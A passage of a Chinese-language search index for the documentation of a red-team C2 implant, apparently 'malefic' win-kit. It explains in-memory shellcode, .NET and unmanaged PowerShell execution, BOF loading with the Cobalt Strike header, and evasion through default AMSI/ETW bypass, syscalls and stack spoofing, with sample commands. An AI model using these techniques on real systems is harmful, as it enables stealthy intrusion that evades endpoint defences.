\u5f62\u5f0f\u6b63\u5e38\u6267\u884c\u5e76\u7ed3\u675f\u7684\u5de5\u5177\u5e76\u4e0d\u4ee3\u8868\u5176\u5728\u7f16\u5199\u65f6\u5b8c\u7f8e\u5173\u95ed\u6240\u6709\u5176\u6301\u6709\u7684\u53e5\u67c4\u6216\u5b8c\u7f8e\u91ca\u653e\u5185\u5b58\uff0c \u7531\u4e8e\u5728 <code>inline</code> \u573a\u666f\u4e0b\uff0c \u6211\u4eec\u53ef\u80fd\u4f1a\u4e27\u5931\u5bf9\u4e8e\u5de5\u5177\u672c\u8eab\u5185\u5b58/\u53e5\u67c4\u7684\u76d1\u63a7\u80fd\u529b\uff08\u4e5f\u8bb8\u5728\u4e0d\u8fdc\u7684\u5c06\u6765\u4f1a\u6709\u6240\u6709\u5185\u5b58\u5206\u914d/\u53e5\u67c4\u6301\u6709\u7684\u76d1\u63a7\uff09\uff0c \u56e0\u6b64\u4f7f\u7528\u65f6\u8bf7\u7740\u91cd\u5c0f\u5fc3 :)</p> <p>\u7531\u4e8e\u6211\u4eec\u63d0\u4f9b\u4e86 <code>BOF</code> \u6267\u884c\u7684\u529f\u80fd\uff0c \u56e0\u6b64\u6211\u66f4\u63a8\u8350\u60a8\u4f7f\u7528\u4e0a\u4f4d\u4ee3\u66ff\uff0c \u5373\u4f7f\u7528 <code>bof</code> \u529f\u80fd\u8fdb\u884c\u62d3\u5c55\u529f\u80fd\u7684\u8c03\u7528:)</p> <pre><code># \u547d\u4ee4\u793a\u4f8b\ninline_exe gogo.exe -t 10 -- -i 127.0.0.1\n</code></pre> <p>\u4e0a\u8ff0\u547d\u4ee4\u8868\u793a\u4ee5\u5185\u8054\u5f62\u5f0f\u5728 <code>implant</code> \u672c\u4f53\u4e2d\u6267\u884c <code>gogo.exe</code>, \u8d85\u65f6\u65f6\u95f4\u4e3a <code>10s</code>\uff0c \u53c2\u6570\u4e3a <code>-i 127.0.0.1</code></p>"},{"location":"IoM/manual/implant/win_kit/#shellcode","title":"Shellcode","text":"<p>\u5e38\u89c1\u7684 <code>Shellcode</code> \u4e3a\u4e00\u6bb5\u7528\u4e8e\u6267\u884c\u7684\u77ed\u5c0f\u7cbe\u608d\u7684\u4ee3\u7801\u6bb5\uff0c\u5176\u4ee5\u4f53\u79ef\u5c0f\uff0c\u53ef\u64cd\u4f5c\u6027\u5927\u7684\u65b9\u5f0f\u5e7f\u4e3a\u4f7f\u7528\uff0c \u56e0\u6b64</p> <p><code>Implant</code> \u652f\u6301\u52a8\u6001\u52a0\u8f7d <code>shellcode</code>, \u5e76\u53ef\u9009\u62e9\u5728\u81ea\u8eab\u8fdb\u7a0b\u8fd8\u662f\u727a\u7272\u8fdb\u7a0b\u4e2d\u8c03\u7528</p> <p>\u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e <code>Implant</code> \u65e0\u6cd5\u5206\u8fa8\u7684 <code>shellcode</code> \u662f\u54ea\u4e2a\u67b6\u6784\u7684\uff0c \u8bf7\u5728\u4f7f\u7528\u8be5\u529f\u80fd\u65f6\uff0c\u5982\u679c\u4e0d\u786e\u5b9a\u67b6\u6784\u548c\u5176\u7a33\u5b9a\u6027\uff0c \u6700\u597d\u4f7f\u7528 <code>\u727a\u7272\u8fdb\u7a0b</code> \u6765\u8fdb\u884c\u8c03\u7528\uff0c \u800c\u975e\u5728\u672c\u4f53\u4e2d\u8fdb\u884c\uff0c \u4ee5\u514d\u7531\u4e8e\u8bef\u64cd\u4f5c\u5931\u53bb\u8fde\u63a5, \u5173\u4e8e\u727a\u7272\u8fdb\u7a0b\uff0c \u60a8\u53ef\u4ee5\u53c2\u7167 <code>Sacrifice Process</code> \u8fd9\u4e00\u5c0f\u8282\u7684\u5185\u5bb9</p> <p>\u76ee\u524d\u5f00\u6e90\u7248\u672c\u4e2d\u4f7f\u7528\u7684\u65b9\u5f0f\u57fa\u4e8e <code>APC</code>, \u5f53\u7136\uff0c <code>Pool party</code> \u6b63\u5728\u8def\u4e0a</p> <pre><code># \u4f7f\u7528\u727a\u7272\u8fdb\u7a0b\nexecute_shellcode xxx.bin\n\n# inline \u6267\u884c\ninline_shellcode xxx.bin\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#net-crl","title":".NET CRL","text":"<p>\u5bf9\u4e8e\u524d\u51e0\u5e74\u7684\u4ece\u4e8b\u5b89\u5168\u5de5\u4f5c\u7684\u4ece\u4e1a\u4eba\u5458\u6765\u8bf4, \u5728 <code>Windows</code> \u7cfb\u7edf\u4e0a\u4f7f\u7528 <code>C#</code> \u7f16\u5199\u5de5\u5177\u7a0b\u5e8f\u5341\u5206\u6d41\u884c\uff0c\u5404\u7c7b\u68c0\u6d4b\u53ca\u53cd\u5236\u624b\u6bb5\u5982 <code>AMSI</code> \u8fd8\u672a\u6dfb\u52a0\u8fdb\u5b89\u5168\u6846\u67b6\u4e2d, \u56e0\u6b64\u5e02\u9762\u4e0a\u7559\u5b58\u4e86\u5927\u91cf\u7531 C#\u7f16\u5199\u5e76\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\u7684\u5404\u7c7b\u5229\u7528\u548c\u5de5\u5177\u7a0b\u5e8f\u96c6\u3002</p> <p><code>C#</code> \u7a0b\u5e8f\u53ef\u4ee5\u5728 <code>Windows</code> \u7684 <code>.Net</code> \u6846\u67b6\u4e2d\u8fd0\u884c,\u800c <code>.Net</code> \u6846\u67b6\u4e5f\u662f\u73b0\u4ee3 <code>Windows</code> \u7cfb\u7edf\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u90e8\u5206\u3002\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u88ab\u79f0\u4e3a <code>Common Language Runtime(CLR)</code> \u7684\u8fd0\u884c\u65f6,<code>Windows</code> \u4e3a\u6b64\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u63a5\u53e3,\u4ee5\u4fbf\u5f00\u53d1\u8005\u64cd\u4f5c <code>\u7cfb\u7edfAPI</code>\u3002</p> <p>\u56e0\u6b64\uff0c <code>Implant</code> \u652f\u6301\u5728\u5185\u5b58\u4e2d\u52a0\u8f7d\u5e76\u8c03\u7528 <code>.Net</code> \u7a0b\u5e8f,\u5e76\u53ef\u9009\u62e9\u662f\u5426\u9700\u8981\u83b7\u53d6\u6807\u51c6\u8f93\u51fa\u3002</p> <p>\u5728 <code>inline</code> \u6267\u884c <code>.Net</code> \u7a0b\u5e8f\u96c6\u65f6\uff0c \u6211\u4eec\u5c06\u4f1a\u5728 <code>implant</code> \u8fdb\u7a0b\u4e2d\u5f15\u5165 <code>.Net</code> \u73af\u5883\uff0c \u5728\u5185\u5b58\u4e2d\u52a0\u8f7d\u5e76\u6267\u884c\u60a8\u7684 <code>.Net</code> \u7a0b\u5e8f\u96c6</p> <p>\u6211\u4eec\u5c06\u4f1a\u9ed8\u8ba4\u4e3a\u60a8\u7ed5\u8fc7 <code>AMSI</code>, <code>WDLP</code> \u4ee5\u53ca <code>ETW</code> \u7684\u68c0\u6d4b</p> <pre><code># \u4f7f\u7528\u793a\u4f8b\nexecute_assemble Seatbelt.exe -- AMSIProviders\n</code></pre> <p>\u4e0a\u8ff0\u547d\u4ee4\u4e3a\u5185\u5b58\u4e2d\u6267\u884c <code>Seatbelt.exe</code> .Net\u7a0b\u5e8f\uff0c \u53c2\u6570\u4e3a<code>AMSIProviders</code></p>"},{"location":"IoM/manual/implant/win_kit/#unmanaged-powershell","title":"Unmanaged Powershell","text":"<p>\u5728\u7ea2\u961f\u7684\u5de5\u4f5c\u9700\u6c42\u4e2d\uff0c \u547d\u4ee4\u6267\u884c\u4e3a\u4e00\u4e2a\u975e\u5e38\u6838\u5fc3\u7684\u529f\u80fd\uff0c \u800c\u73b0\u4ee3\u7684 <code>Powershell</code> \u5c31\u662f\u4e00\u4e2a\u5728 <code>Windows</code> \u4e2d\u53ca\u5176\u91cd\u8981\u4e14\u5e38\u7528\u7684\u811a\u672c\u89e3\u91ca\u5668\uff0c \u6709\u5f88\u591a\u529f\u80fd\u5f3a\u5927\u7684 Powershell \u811a\u672c\u53ef\u4ee5\u652f\u6301\u7ea2\u961f\u4eba\u5458\u5728\u76ee\u6807\u7cfb\u7edf\u4e0a\u7684\u5de5\u4f5c</p> <p>\u56e0\u6b64\uff0c\u9488\u5bf9\u76f4\u63a5\u8c03\u7528 <code>Powershell.exe</code> \u6765\u6267\u884c <code>powershell</code> \u547d\u4ee4\u7684\u68c0\u6d4b\u5c42\u51fa\u4e0d\u7a77\uff0c\u4e3a\u907f\u514d\u9488\u5bf9\u6b64\u7c7b\u7684\u5b89\u5168\u68c0\u67e5</p> <p><code>Implant</code> \u652f\u6301\u5728\u4e0d\u4f9d\u8d56\u7cfb\u7edf\u81ea\u8eab <code>Powershell.exe</code> \u7a0b\u5e8f\u7684\u60c5\u51b5\u4e0b\u6267\u884c <code>Powershell cmdlet</code> \u547d\u4ee4, \u5177\u4f53\u53ef\u53c2\u7167 <code>Post Exploitation</code> \u7ae0\u8282\u4e2d <code>Running Commands</code> \u5c0f\u8282\u7684\u5185\u5bb9,\u8fdb\u4e00\u6b65\u4e86\u89e3\u76f8\u5173\u529f\u80fd\u7684\u4f7f\u7528\u65b9\u6cd5\u3002</p> <ul> <li>\u4f7f\u7528 <code>powershell</code> \u547d\u4ee4\u6765\u5524\u8d77 <code>powershell.exe</code> \u4ee5\u6267\u884c <code>powershll</code> \u547d\u4ee4</li> <li>\u4f7f\u7528 <code>powerpick</code> \u547d\u4ee4\u6765\u6446\u8131 <code>powershell.exe</code> \u6267\u884c <code>powershell</code> \u547d\u4ee4</li> <li>\u4f7f\u7528 <code>powershell_import</code> \u547d\u4ee4\u6765\u5411 <code>Implant</code> \u5bfc\u5165 <code>powershell script</code>\uff0c \u7cfb\u7edf\u5c06\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u8be5\u811a\u672c\uff0c \u4ee5\u518d\u540e\u7eed\u4f7f\u7528\u65f6\u76f4\u63a5\u8c03\u7528\u8be5\u811a\u672c\u7684\u5185\u5bb9</li> </ul> <p><pre><code># \u4f7f\u7528\u793a\u4f8b\npowerpick --script powerview.ps1 -- \"Get-NetProcess\"\n</code></pre> \u5373\u4f7f\u7528 <code>unmanaged powershell</code> \u6267\u884c <code>powerview.ps1</code> \u811a\u672c\u4e2d\u7684 <code>Get-NetProcess</code> \u547d\u4ee4</p>"},{"location":"IoM/manual/implant/win_kit/#bof","title":"BOF","text":"<p>\u5e38\u89c1\u7684\uff0c \u4e00\u4e2a C \u8bed\u8a00\u6e90\u7a0b\u5e8f\u88ab\u7f16\u8bd1\u6210\u76ee\u6807\u7a0b\u5e8f\u7531\u56db\u4e2a\u9636\u6bb5\u7ec4\u6210\uff0c \u5373\uff08\u9884\u5904\u7406\uff0c \u7f16\u8bd1\uff0c \u6c47\u7f16\uff0c \u94fe\u63a5\uff09</p> <p>\u800c\u6211\u4eec\u7684 <code>Beacon Object File(BOF)</code> \u662f\u4ee3\u7801\u5728\u7ecf\u8fc7\u524d\u4e09\u4e2a\u9636\u6bb5\uff08\u9884\u5904\u7406\uff0c \u7f16\u8bd1\uff0c \u6c47\u7f16\uff09\u540e\uff0c\u672a\u94fe\u63a5\u4ea7\u751f\u7684 <code>Obj</code> \u6587\u4ef6\uff08\u901a\u5e38\u88ab\u79f0\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff09</p> <p>\u8be5\u7c7b\u578b\u6587\u4ef6\u7531\u4e8e\u672a\u8fdb\u884c\u94fe\u63a5\u64cd\u4f5c\uff0c \u56e0\u6b64\u4e00\u822c\u4f53\u79ef\u8f83\u5c0f\uff0c \u8f83\u5e38\u89c1 <code>DLL/EXE</code> \u8fd9\u7c7b\u53ef\u6267\u884c\u7a0b\u5e8f\u66f4\u6613\u4e8e\u4f20\u8f93\uff0c\u88ab\u5e7f\u6cdb\u5229\u7528\u4e8e\u77e5\u540d C2 \u5de5\u5177 Cobalt Strike(\u540e\u79f0 CS)\u4e2d\uff0c \u4e0d\u5c11\u7ea2\u961f\u5f00\u53d1\u4eba\u5458\u4e3a\u5176\u6a21\u5757\u7f16\u5199\u4e86 BOF \u7248\u672c\uff0c \u56e0\u6b64 <code>Implant</code> \u5bf9\u8be5\u529f\u80fd\u8fdb\u884c\u4e86\u9002\u914d\u5de5\u4f5c\uff0c <code>Implant</code> \u652f\u6301\u5927\u90e8\u5206 CS \u63d0\u4f9b\u7684\u5185\u90e8 API, \u4ee5\u51cf\u5c11\u5404\u4f7f\u7528\u4eba\u5458\u7684\u4f7f\u7528\u53ca\u9002\u914d\u6210\u672c</p> <p>\u8bf7\u6ce8\u610f\uff0c \u7531\u4e8e\u6211\u4eec\u7684 <code>BOF</code> \u529f\u80fd\u4e0e <code>CS</code> \u7c7b\u4f3c\uff0c\u6267\u884c\u4e8e\u672c\u8fdb\u7a0b\u4e2d\uff0c \u56e0\u6b64\u5728\u4f7f\u7528\u8be5\u529f\u80fd\u65f6\u8bf7\u786e\u4fdd\u4f7f\u7528\u7684 <code>BOF</code> \u6587\u4ef6\u53ef\u4ee5\u6b63\u786e\u6267\u884c\uff0c \u5426\u5219\u5c06\u4e22\u5931\u5f53\u524d\u8fde\u63a5</p> <pre><code># \u4f7f\u7528\u793a\u4f8b\nbof dir.x64.o \"str:C:\\\\Program Files\" \n</code></pre> <p>\u5373\u4f7f\u7528 <code>bof</code> \u529f\u80fd\u52a0\u8f7d\u6267\u884c <code>dir.x64.o</code>\uff0c \u53c2\u6570\u4e3a <code>str:C:\\\\Program Files</code> \u60a8\u53ef\u9009\u7684\u53c2\u6570\u6a21\u5f0f\u6709: - wstr: \u4ee5null\u7ed3\u5c3e\u7684\u5bbd\u5b57\u7b26\u4e32 - str:  \u4ee5null\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32 - int:  4\u5b57\u8282\u957f\u5ea6\u6574\u5f62 - short: 2 \u5b57\u8282\u957f\u5ea6\u77ed\u6574\u5f62 - bin: \u4ee5base64\u7f16\u7801\u540e\u7684bytes\u6570\u7ec4</p>"},{"location":"IoM/manual/implant/win_kit/#opsec","title":"OPSEC","text":""},{"location":"IoM/manual/implant/win_kit/#syscall","title":"Syscall","text":"<p>\u867d\u7136\u662f\u8001\u751f\u5e38\u6001\u7684\u6280\u672f\uff0c \u4f46\u4f5c\u4e3a\u57fa\u5efa\u8bbe\u8ba1\u7684\u6846\u67b6\u600e\u4e48\u4f1a\u5c11\u7684\u4e86\u5b83\u5462 :)</p> <p>\u5728 <code>Syscall</code> \u6f2b\u957f\u7684\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0c \u51fa\u73b0\u4e86\u591a\u79cd\u95e8\u6280\u672f\uff0c \u5728\u6743\u8861\u4e86\u591a\u4e2a\u6280\u672f\u540e</p> <p>\u6211\u4eec\u6700\u7ec8\u9009\u7528\u901a\u8fc7\u5730\u5740\u6392\u5e8f\u8ba1\u7b97 <code>Syscall Num</code> \u5e76\u8f85\u4ee5\u968f\u673a <code>Syscall</code> \u5730\u5740\u4f5c\u4e3a\u6211\u4eec\u9ed8\u8ba4\u7684 <code>syscall</code> \u8c03\u7528</p> <p>\u4f46\u5b9e\u9645\u4e0a\u4e3a\u4e86\u89c4\u907f\u8c03\u7528\u68c0\u6d4b\uff0c \u6700\u597d\u7528\u7684\u8fd8\u662f\u52a8\u6001\u83b7\u53d6 + \u5806\u6808\u6df7\u6dc6 \uff08\u76ee\u524d\u9ed8\u8ba4\u91c7\u7528\uff09 \u5f53\u7136\uff0c \u8fd9\u91cc\u7684\u52a8\u6001\u83b7\u53d6\u51fd\u6570\u7684\u552f\u4e00\u76ee\u7684\u5c31\u662f\u51cf\u5c11\u5bfc\u5165\u8868\u7279\u5f81 :)</p>"},{"location":"IoM/manual/implant/win_kit/#thread-tack-spoofing","title":"THREAD TACK SPOOFING","text":"<p>\u5728\u6f2b\u957f\u7684\u653b\u9632\u65c5\u7a0b\u4e2d\uff0c \u5806\u6808\u52ab\u6301\u662f\u4e00\u4e2a\u975e\u5e38\u7cbe\u7f8e\u7684\u70b9\u5b50\uff0c \u7cbe\u7f8e\u5230\u8ba9\u6211\u5b8c\u5168\u653e\u5f03\u4f7f\u7528 <code>syscall</code> \u6765\u8fdb\u884c\u5e95\u5c42 <code>API</code> \u7684\u6784\u5efa</p> <p>\u8be5\u6280\u672f\u7684\u6838\u5fc3\u601d\u60f3\u5728\u4e8e\uff0c \u7a0b\u5e8f\u5728\u521b\u5efa\u6bcf\u4e00\u4e2a\u51fd\u6570\u6808\u5e27\u65f6\uff0c \u90fd\u4f1a\u5c06\u5176\u8fd4\u56de\u5730\u5740\u538b\u5165\u6808\u4e2d\uff0c \u4ece\u5728\u51fd\u6570\u4e0a\u4e0b\u6587\u7ed3\u675f\u540e\u8fd4\u56de\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\uff0c \u800c\u8fd9\u6837\u4e5f\u53ef\u4ee5\u65b9\u4fbf\u7684\u8fdb\u884c <code>unwind</code>\uff0c \u5373\u8c03\u7528\u5806\u6808\u7684\u5206\u6790\u548c\u68c0\u6d4b\uff0c \u56e0\u6b64\uff0c \u5982\u679c\u6211\u4eec\u5728\u8c03\u7528\u70b9\u5904\u66ff\u6362\u8fd4\u56de\u5730\u5740\u4e3a\u6211\u4eec\u63d0\u524d\u9884\u8bbe\u597d\u7684\u8fd4\u56de\u5730\u5740\uff0c \u5e76\u76f8\u5bf9\u5e94\u7684\u521b\u5efa\u5047\u7684\u6808\u5e27\uff0c \u90a3\u4e48\u5728\u771f\u6b63\u8c03\u7528\u65f6\uff0c \u5728 <code>trace stack</code> \u65f6\uff0c \u6211\u4eec\u7684\u6808\u5e27\u5c31\u662f\u975e\u5e38\u5e72\u51c0\u975e\u5e38\u5b8c\u7f8e\u7684</p> <p>\u6211\u4eec\u5c06\u6240\u6709\u5e95\u5c42 <code>API</code> \u90fd\u8fdb\u884c\u4e86\u9ed8\u8ba4\u7684\u5806\u6808\u6df7\u6dc6\uff0c \u901a\u8fc7\u4f2a\u9020\u6808\u5e27\u6765\u8fbe\u5230\u6240\u6709\u8c03\u7528\u70b9\u5747\u662f\u6765\u81ea\u4e8e\u67d0\u4e2a\u968f\u673a\u7684\u7cfb\u7edf\u51fd\u6570\uff0c \u800c\u975e\u5728\u67d0\u4e2a\u79c1\u6709\u5185\u5b58\u4e2d :)</p> <p>\u5e76\u4e14\u7531\u4e8e\u6211\u4eec <code>implant</code> \u672c\u4f53\u672c\u8eab\u4f1a\u6709\u5f88\u591a\u5408\u6cd5\u7684\u51fd\u6570\u8c03\u7528\u884c\u4e3a\uff0c \u8f85\u4ee5 <code>kit</code> \u4e2d\u5404\u7c7b\u529f\u80fd\u6a21\u5757\u5e72\u51c0\u7684\u6808\u5e27\uff0c\u6211\u4eec\u7684\u884c\u4e3a\u5c31\u4f1a\u66f4\u8d8b\u8fd1\u4e8e\u5408\u6cd5\u7a0b\u5e8f</p> <p>\u5f53\u7136\uff0c \u7531\u4e8e <code>CET</code> \u7684\u51fa\u73b0\uff0c \u8fd9\u9879\u6280\u672f\u7684\u68c0\u6d4b\u4e5f\u6709\u4e86\u89e3\u6cd5\uff0c \u4f46\u653b\u9632\u7684\u957f\u6cb3\u603b\u662f\u6f2b\u6f2b</p>"},{"location":"IoM/manual/implant/win_kit/#\u5f00\u53d1\u624b\u518csdk","title":"\u5f00\u53d1\u624b\u518c/SDK","text":""},{"location":"IoM/manual/implant/win_kit/#bof-\u5f00\u53d1","title":"BOF \u5f00\u53d1","text":"<p>\u4e3a\u51cf\u5c11\u4f7f\u7528\u4eba\u5458\u7684\u5f00\u53d1\u6210\u672c\uff0c \u672c <code>Implant</code> \u7684 <code>BOF</code> \u5f00\u53d1\u6807\u51c6\u4e0e <code>CS</code> \u5de5\u5177\u76f8\u540c\uff0c\u53ef\u53c2\u7167 <code>CS</code> \u7684\u5f00\u53d1\u6a21\u7248\u8fdb\u884c\u5f00\u53d1\uff0c</p> <p>\u5176\u6a21\u7248\u5982\u4e0b\uff0c \u94fe\u63a5\u4e3a https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h</p> <pre><code>/*\n * Beacon Object Files (BOF)\n * -------------------------\n * A Beacon Object File is a light-weight post exploitation tool that runs\n * with Beacon's inline-execute command.\n *\n * Additional BOF resources are available here:\n *   - https://github.com/Cobalt-Strike/bof_template\n *\n * Cobalt Strike 4.x\n * ChangeLog:\n *    1/25/2022: updated for 4.5\n *    7/18/2023: Added BeaconInformation API for 4.9\n *    7/31/2023: Added Key/Value store APIs for 4.9\n *                  BeaconAddValue, BeaconGetValue, and BeaconRemoveValue\n *    8/31/2023: Added Data store APIs for 4.9\n *                  BeaconDataStoreGetItem, BeaconDataStoreProtectItem,\n *                  BeaconDataStoreUnprotectItem, and BeaconDataStoreMaxEntries\n *    9/01/2023: Added BeaconGetCustomUserData API for 4.9\n */\n\n/* data API */\ntypedef struct {\n        char * original; /* the original buffer [so we can free it] */\n        char * buffer;   /* current pointer into our buffer */\n        int    length;   /* remaining length of data */\n        int    size;     /* total size of this buffer */\n} datap;\n\nDECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);\nDECLSPEC_IMPORT char *  BeaconDataPtr(datap * parser, int size);\nDECLSPEC_IMPORT int     BeaconDataInt(datap * parser);\nDECLSPEC_IMPORT short   BeaconDataShort(datap * parser);\nDECLSPEC_IMPORT int     BeaconDataLength(datap * parser);\nDECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);\n\n/* format API */\ntypedef struct {\n        char * original; /* the original buffer [so we can free it] */\n        char * buffer;   /* current pointer into our buffer */\n        int    length;   /* remaining length of data */\n        int    size;     /* total size of this buffer */\n} formatp;\n\nDECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);\nDECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);\nDECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);\nDECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);\nDECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);\nDECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);\nDECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);\n\n/* Output Functions */\n#define CALLBACK_OUTPUT      0x0\n#define CALLBACK_OUTPUT_OEM  0x1e\n#define CALLBACK_OUTPUT_UTF8 0x20\n#define CALLBACK_ERROR       0x0d\n\nDECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);\nDECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);\n\n\n/* Token Functions */\nDECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);\nDECLSPEC_IMPORT void   BeaconRevertToken();\nDECLSPEC_IMPORT BOOL   BeaconIsAdmin();\n\n/* Spawn+Inject Functions */\nDECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);\nDECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);\nDECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);\nDECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);\nDECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);\n\n/* Utility Functions */\nDECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);\n\n/* Beacon Information */\n/*\n *  ptr  - pointer to the base address of the allocated memory.\n *  size - the number of bytes allocated for the ptr.\n */\ntypedef struct {\n        char * ptr;\n        size_t size;\n} HEAP_RECORD;\n#define MASK_SIZE 13\n\n/*\n *  sleep_mask_ptr        - pointer to the sleep mask base address\n *  sleep_mask_text_size  - the sleep mask text section size\n *  sleep_mask_total_size - the sleep mask total memory size\n *\n *  beacon_ptr   - pointer to beacon's base address\n *                 The stage.obfuscate flag affects this value when using CS default loader.\n *                    true:  beacon_ptr = allocated_buffer - 0x1000 (Not a valid address)\n *                    false: beacon_ptr = allocated_buffer (A valid address)\n *                 For a UDRL the beacon_ptr will be set to the 1st argument to DllMain\n *                 when the 2nd argument is set to DLL_PROCESS_ATTACH.\n *  sections     - list of memory sections beacon wants to mask. These are offset values\n *                 from the beacon_ptr and the start value is aligned on 0x1000 boundary.\n *                 A section is denoted by a pair indicating the start and end offset values.\n *                 The list is terminated by the start and end offset values of 0 and 0.\n *  heap_records - list of memory addresses on the heap beacon wants to mask.\n *                 The list is terminated by the HEAP_RECORD.ptr set to NULL.\n *  mask         - the mask that beacon randomly generated to apply\n */\ntypedef struct {\n        char  * sleep_mask_ptr;\n        DWORD   sleep_mask_text_size;\n        DWORD   sleep_mask_total_size;\n\n        char  * beacon_ptr;\n        DWORD * sections;\n        HEAP_RECORD * heap_records;\n        char    mask[MASK_SIZE];\n} BEACON_INFO;\n\nDECLSPEC_IMPORT void   BeaconInformation(BEACON_INFO * info);\n\n/* Key/Value store functions\n *    These functions are used to associate a key to a memory address and save\n *    that information into beacon.  These memory addresses can then be\n *    retrieved in a subsequent execution of a BOF.\n *\n *    key - the key will be converted to a hash which is used to locate the\n *          memory address.\n *\n *    ptr - a memory address to save.\n *\n * Considerations:\n *    - The contents at the memory address is not masked by beacon.\n *    - The contents at the memory address is not released by beacon.\n *\n */\nDECLSPEC_IMPORT BOOL BeaconAddValue(const char * key, void * ptr);\nDECLSPEC_IMPORT void * BeaconGetValue(const char * key);\nDECLSPEC_IMPORT BOOL BeaconRemoveValue(const char * key);\n\n/* Beacon Data Store functions\n *    These functions are used to access items in Beacon's Data Store.\n *    BeaconDataStoreGetItem returns NULL if the index does not exist.\n *\n *    The contents are masked by default, and BOFs must unprotect the entry\n *    before accessing the data buffer. BOFs must also protect the entry\n *    after the data is not used anymore.\n *\n */\n\n#define DATA_STORE_TYPE_EMPTY 0\n#define DATA_STORE_TYPE_GENERAL_FILE 1\n\ntypedef struct {\n        int type;\n        DWORD64 hash;\n        BOOL masked;\n        char* buffer;\n        size_t length;\n} DATA_STORE_OBJECT, *PDATA_STORE_OBJECT;\n\nDECLSPEC_IMPORT PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index);\nDECLSPEC_IMPORT void BeaconDataStoreProtectItem(size_t index);\nDECLSPEC_IMPORT void BeaconDataStoreUnprotectItem(size_t index);\nDECLSPEC_IMPORT size_t BeaconDataStoreMaxEntries();\n\n/* Beacon User Data functions */\nDECLSPEC_IMPORT char * BeaconGetCustomUserData();\n</code></pre> <p>\u4e3a\u907f\u514d\u7684 <code>BOF</code> \u7a0b\u5e8f\u7531\u4e8e\u8c03\u7528\u4e86\u672c <code>Implant</code> \u672a\u9002\u914d\u7684\u51fd\u6570\u5bfc\u81f4\u4e22\u5931\u8fde\u63a5\uff0c \u8bf7\u6ce8\u610f\u672c <code>Implant</code> \u73b0\u652f\u6301\u4f7f\u7528\u7684\u51fd\u6570\u5217\u8868\u5982\u4e0b:</p> <pre><code>BeaconDataExtract\nBeaconDataPtr\nBeaconDataInt\nBeaconDataLength\nBeaconDataParse\nBeaconDataShort\nBeaconPrintf\nBeaconOutput\n\nBeaconFormatAlloc\nBeaconFormatAppend\nBeaconFormatFree\nBeaconFormatInt\nBeaconFormatPrintf\nBeaconFormatReset\nBeaconFormatToString\n\nBeaconUseToken\nBeaconIsAdmIn\n\nBeaconCleanupProcess\n</code></pre> <p>Danger</p> <p>\u8bf7\u5728\u7f16\u5199 <code>BOF</code> \u65f6\u8bf7\u5728\u672c\u5730\u8fdb\u884c\u5145\u5206\u6d4b\u8bd5, BOF\u5bfc\u81f4\u7684panic\u4f1a\u5bfc\u81f4\u8fdb\u7a0b\u9000\u51fa</p>"},{"location":"IoM/manual/implant/win_kit/#beacongate","title":"BeaconGate","text":"<p>\u5546\u4e1a\u7248\u4e13\u5c5e</p> <p>\u975e\u5546\u4e1a\u7248\u672c\u53ea\u5141\u8bb8\u4f7f\u7528\u9884\u5b9a\u4e49\u9884\u7f16\u8bd1\u7684\u529f\u80fd\uff0c \u4f46\u662f\u65e0\u6cd5\u6df1\u5ea6\u5b9a\u5236\u7ec6\u8282\u3002 </p> <p><code>malefic-win-kit</code>  \u4e2d\u7528\u5230\u7684 <code>\u7cfb\u7edfapi</code> \u90fd\u7ecf\u8fc7\u4e86win-kit\u7684BeaconGate\u5e95\u5ea7\u91cd\u8f7d\uff0c \u5e76\u63d0\u4f9b\u4e86\u591a\u79cd\u65b9\u5f0f\u5bf9\u5916\u66b4\u9732\u3002\u5305\u62ec\uff1a - native syscall - dynamic syscall - indirect syscall - stask spoofer</p> <p>\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u6211\u4eec\u4e3a <code>windows</code> \u539f\u751f <code>api</code> \u5199\u4e86\u5927\u91cf\u7684 <code>wrapper</code>\uff0c \u8c03\u7528\u90fd\u662f\u901a\u8fc7 <code>wrapper</code> 